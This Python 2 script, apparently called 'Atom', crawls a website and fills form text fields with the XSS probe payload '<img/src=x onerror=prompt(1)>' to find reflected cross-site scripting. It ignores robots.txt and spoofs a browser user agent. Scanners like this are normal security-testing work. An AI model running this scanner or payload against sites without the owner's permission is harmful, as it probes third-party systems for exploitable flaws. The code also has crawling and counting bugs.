#!/usr/bin/python

import mechanize
import sys
import argparse

parser = argparse.ArgumentParser(description="Atom - This a XSS finder coded in Python by Muhammad Shahzad, This was coded by him for automating his task and not launching it or make use of it to market himself like others are doing. This tool spiders hundreds of pages, which may take a little time as well - After spidering then it searches for forms present in those pages and then check those pages by filling those forms and then checking if our input is reflected back in the HTML document. This tool should be used for legal purposes for example testing your own sites/applications as testing others without permission is considered illegal. ")
parser.add_argument('-t', type=str, help="Define the target URL - Make sure its a valid one running on HTTP protocol.", required=True)
cmdargs = parser.parse_args()
class xssfinder:

	def __init__(self,url):
		if 'https://' in url: #small checks to get the URL we want.
			url = url.replace('https://','')

		if 'http://' in url:
			url = url.replace('http://', '')

		if 'www.' in url:
			url = url.replace('www.', '')
		self.url = 'http://www.' + url
		self.base_url = url
		self.links = []
		self.br = mechanize.Browser()
		self.br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
		self.br.set_handle_robots(False)
		self.br.set_handle_refresh(False)
		self.br.open(self.url)
		self.count = 0
		self.vulnerable = 0

	def spider(self):
		print "Finding all of the links.\n"
		try:
			for link in self.br.links():
				if self.base_url in link.absolute_url:
					if '@' not in link.absolute_url:
						if link.absolute_url not in self.links:
							if '.pdf' not in link.absolute_url:
								if '.jpg' not in link.absolute_url:
									self.links.append(str(link.absolute_url))
			for l in self.links:
				self.br.open(self.url)
				for link in self.br.links():
					if self.base_url in link.absolute_url:
						if '@' not in link.absolute_url:
							if link.absolute_url not in self.links:
								if '.pdf' not in link.absolute_url:
									if '.jpg' not in link.absolute_url:
										self.links.append(str(link.absolute_url))
		except:
			pass
		finally:
			for l in self.links:
				print l + '\n'

	def xssfind(self):
		for l in self.links:
			try:
				self.br.open(l)
			except:
				pass
			try:
				for form in self.br.forms():
					self.count += 1
			except:
				pass
			if self.count > 0:
				try:
					param = list(self.br.forms())[0]
				except:
					pass
				try:
					self.br.select_form(nr=0)
				except:
					pass
				for p in param.controls :
					try:
						if 'TextControl' in p:
							self.br.form[str(p.name)] = '<img/src=x onerror=prompt(1)>'
					except:
						pass
					try:
						self.br.submit()
					except:
						pass
					try:
						if '<img/src=x onerror=prompt(1)>' in self.br.response().read():
							print l + ' is vulnerble' 
							self.vulnerable += 1
					except:
						pass
					try:
						self.br.back()
					except:
						pass

		if self.vulnerable > 0:
			print "Vulnerable forms: " + str(self.vulnerable)
		else:
			print "No vulnerale form."
		print "Total forms: " + str(self.count)

xss = xssfinder(cmdargs.t)
xss.spider()
xss.xssfind()